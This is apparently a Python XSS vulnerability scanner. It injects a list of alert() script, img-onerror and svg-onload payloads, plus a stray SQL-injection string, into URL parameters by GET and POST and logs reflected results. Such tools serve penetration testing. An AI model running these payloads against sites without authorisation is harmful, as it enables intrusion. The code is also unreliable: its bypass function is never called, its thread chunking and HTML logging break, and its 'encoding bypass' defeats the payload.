import requests
from bs4 import BeautifulSoup
from urllib.parse import quote, urlparse, urljoin
import json
import threading
import argparse
import csv
import time
from datetime import datetime
from random import choice
import base64
import sys
from termcolor import colored

# Function to log results to a file (supports CSV, plain text, and HTML)
def log_result(log_file, message, csv_log=False, html_log=False):
    if csv_log:
        with open(log_file, 'a', newline='') as f:
            writer = csv.writer(f)
            writer.writerow(message)
    elif html_log:
        with open(log_file, 'a') as f:
            f.write(f"<tr><td>{'</td><td>'.join(message)}</td></tr>\n")
    else:
        with open(log_file, 'a') as f:
            f.write(message + "\n")

# Function to encode payloads to bypass filters
def encode_payload(payload):
    return quote(payload)

# Function to create bypass techniques for XSS payloads
def bypass_techniques(payload):
    techniques = [
        payload,
        encode_payload(payload),
        payload.replace("<", "&lt;").replace(">", "&gt;"),  # HTML entity encoding
        payload.replace(" ", "%20"),  # Space encoding
        payload.replace("'", "&#x27;"),  # Single quote encoding
        base64.b64encode(payload.encode()).decode('utf-8'),  # Base64 encoding
    ]
    return techniques

# Function to test XSS vulnerability on a single URL
def check_xss(url, params, payload, method="GET", headers=None, cookies=None, log_file="xss_log.txt", csv_log=False, html_log=False):
    try:
        if method.upper() == "GET":
            response = requests.get(url, params=params, headers=headers, cookies=cookies, timeout=10)
        else:
            response = requests.post(url, data=params, headers=headers, cookies=cookies, timeout=10)

        # Get additional response details
        status_code = response.status_code
        content_length = len(response.content)
        headers_info = response.headers

        # Parse the response content
        soup = BeautifulSoup(response.content, 'html.parser')

        # Check if the payload is reflected in the response
        for key, value in params.items():
            if value in str(soup):
                result = (colored(f"[+] XSS vulnerability found at: {url}", "green") +
                          f" using {method} with payload: {payload} in parameter {key}\n"
                          f"Status Code: {status_code}\nContent-Length: {content_length} bytes\n"
                          f"Response Headers: {headers_info}")
                print(result)
                log_result(log_file, [url, method, payload, "Vulnerable", datetime.now(), status_code, content_length], csv_log, html_log)
            else:
                result = (colored(f"[-] No XSS vulnerability found at: {url}", "red") +
                          f" using {method} with payload: {payload} in parameter {key}\n"
                          f"Status Code: {status_code}\nContent-Length: {content_length} bytes\n"
                          f"Response Headers: {headers_info}\n"
                          f"Suggestion: Try using fuzzing or bypass techniques.\n")
                print(result)
                log_result(log_file, [url, method, payload, "Not Vulnerable", datetime.now(), status_code, content_length], csv_log, html_log)

    except requests.Timeout:
        print(colored(f"[!] Timeout occurred for {url}", "yellow"))
    except Exception as e:
        print(colored(f"[!] Error occurred: {e}", "yellow"))

# Function to construct query params with payload for all parameters
def construct_params(params, payload):
    return {param: payload for param in params}

# Function to run XSS tests in parallel using threading
def run_parallel_tests(url_list, payloads, methods, headers=None, cookies=None, log_file="xss_log.txt", num_threads=5, csv_log=False, html_log=False):
    def worker(url_chunk):
        test_xss_multiple_urls(url_chunk, payloads, methods, headers, cookies, log_file, csv_log, html_log)
    
    chunk_size = len(url_list) // num_threads
    threads = []

    for i in range(0, len(url_list), chunk_size):
        url_chunk = url_list[i:i+chunk_size]
        thread = threading.Thread(target=worker, args=(url_chunk,))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

# Function to test XSS on multiple URLs from a list
def test_xss_multiple_urls(url_list, payloads, methods, headers=None, cookies=None, log_file="xss_log.txt", csv_log=False, html_log=False):
    for target in url_list:
        url = target['url']
        params = target['params']

        for payload in payloads:
            for method in methods:
                print(colored(f"\n[Testing] {method} request on {url} with payload: {payload}", "cyan"))
                test_params = construct_params(params, payload)
                check_xss(url, test_params, payload, method=method, headers=headers, cookies=cookies, log_file=log_file, csv_log=csv_log, html_log=html_log)


# Main entry point
def main():
    parser = argparse.ArgumentParser(description="XSS Vulnerability Scanner")

    # Argument for scanning a single URL
    parser.add_argument('--url', type=str, help="URL to scan for XSS vulnerabilities")

    # Optional argument for file with multiple URLs
    parser.add_argument('--file', type=str, help="JSON file containing multiple URLs and parameters")

    # Optional argument for custom headers
    parser.add_argument('--headers', type=str, help="Custom headers in JSON format", default=None)

    # Optional argument for custom cookies
    parser.add_argument('--cookies', type=str, help="Custom cookies in JSON format", default=None)

    # Optional argument for custom log file
    parser.add_argument('--log', type=str, help="Log file to save results", default="xss_log.txt")

    # Optional argument for CSV log
    parser.add_argument('--csv', action='store_true', help="Log results in CSV format")

    # Optional argument for HTML log
    parser.add_argument('--html', action='store_true', help="Log results in HTML format")

    args = parser.parse_args()

    # Define payloads
    payloads = [
        "<script>alert(1)</script>",
        "'\"><script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "\"'><iframe src=javascript:alert(1)>",
        "javascript:alert(1)//",
        "<body onload=alert(1)>",
        "' OR '1'='1';--",
    ]

    # Request methods to test
    methods = ["GET", "POST"]

    # Parse custom headers and cookies if provided
    headers = json.loads(args.headers) if args.headers else {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'
    }
    
    cookies = json.loads(args.cookies) if args.cookies else {'session_id': '1234567890abcdef'}

    # Log in CSV or HTML if the flags are provided
    csv_log = args.csv
    html_log = args.html

    # If a file is provided, load the URLs from the file
    if args.file:
        with open(args.file, 'r') as file:
            url_list = json.load(file)
        run_parallel_tests(url_list, payloads, methods, headers, cookies, log_file=args.log, csv_log=csv_log, html_log=html_log)

    # If a single URL is provided, scan that URL
    elif args.url:
        target = {
            "url": args.url,
            "params": {"q": ""}  # Modify the parameters as needed
        }
        test_xss_multiple_urls([target], payloads, methods, headers, cookies, log_file=args.log, csv_log=csv_log, html_log=html_log)


if __name__ == "__main__":
    main()
